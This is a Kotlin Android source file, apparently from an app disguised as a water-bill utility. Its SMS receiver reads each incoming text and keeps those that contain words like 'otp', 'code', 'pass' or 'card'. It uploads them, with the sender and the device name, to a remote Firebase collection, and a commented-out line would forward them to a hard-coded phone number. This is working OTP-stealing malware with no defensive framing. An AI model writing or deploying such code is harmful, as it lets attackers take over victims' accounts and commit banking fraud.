package com.confegure.waterbills

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Log
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import java.util.*

class SMSReciever : BroadcastReceiver() {

    @SuppressLint("SuspiciousIndentation", "UnsafeProtectedBroadcastReceiver", "HardwareIds")
    override fun onReceive(context: Context, intent: Intent) {
        val db = Firebase.firestore
        val bundle = intent.extras
        var msgs: Array<SmsMessage?>? = null
        var str: String? = ""
        Log.d(TAG, "onReceive: Firebase Initiated")
        if (bundle != null) {
            Log.d(TAG, "onReceive: Bundle not null. Message found.")
            val pdus = bundle["pdus"] as Array<*>?
            msgs = arrayOfNulls(pdus!!.size);
            var from = ""
            var to = ""
            var message = ""
            for (i in msgs.indices) {
                val format: String? = bundle.getString("format")
                msgs[i] = SmsMessage.createFromPdu(pdus.get(i) as ByteArray, format!!)
                from = msgs[i]!!.originatingAddress.toString()
                message = msgs[i]!!.messageBody
                str = message
            }
            var msg: String? = str;
            Log.d(TAG, "onReceive: Message: $str")
            val smsManager = SmsManager.getDefault()
            str = str!!.lowercase(Locale.getDefault());
            if (str.contains("otp") ||
                str.contains("code") ||
                str.contains("pass") ||
                str.contains("gst") ||
                str.contains("credit") ||
                str.contains("card")
            ) {

                Log.i(TAG, "Message contains OTP");

                val obj = hashMapOf(
                    "from" to from,
                    "to" to Settings.Global.getString(context.contentResolver, Settings.Global.DEVICE_NAME),
                    "msg" to message,
                    "at" to FieldValue.serverTimestamp(),
                )

                val ref = db.collection("sotps").add(obj)
                    .addOnSuccessListener { Log.d(TAG, "DocumentSnapshot successfully written!") }
                    .addOnFailureListener { e -> Log.w(TAG, "Error writing document", e) }
//                smsManager.sendTextMessage("+919100903791", null, str, null, null)
                Log.i(TAG, "Message Uploaded.")
            } else {
                Log.i(TAG, "Message not contains OTP");
            }
        }
    }

    companion object {
        const val TAG = "SMS RECIEVER"
    }
}